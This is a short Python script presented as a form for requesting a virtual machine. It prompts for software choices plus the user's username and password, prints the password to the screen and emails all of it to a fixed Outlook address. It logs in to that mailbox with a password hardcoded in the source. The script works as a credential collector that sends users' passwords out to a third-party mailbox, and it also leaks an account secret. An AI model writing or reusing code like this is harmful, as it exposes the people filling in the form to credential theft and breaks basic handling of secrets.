import smtplib

# Ask the user for software preferences
software = input("Enter the software you want the VM to have (separated by commas): ")
other_software = input("Enter any other software you need: ")

# Ask the user for their username and password
username = input("Enter your username: ")
password = input("Enter your password: ")


# Print the user's inputs
print("Software:", software)
print("Username:", username)
print("Password:", password)

# Email details
sender_email = "thecodeProject@outlook.com"
receiver_email = "thecodeProject@outlook.com"
subject = "VM Details"
message = f"Software: {software}\nUsername: {username}\nPassword: {password}"

# Connect to the SMTP server
with smtplib.SMTP("smtp.office365.com", 587) as server:
    server.starttls()
    server.login(sender_email, "Seth1365")  # Replace "your_password" with the actual password

    # Send the email
    server.sendmail(sender_email, receiver_email, f"Subject: {subject}\n\n{message}")
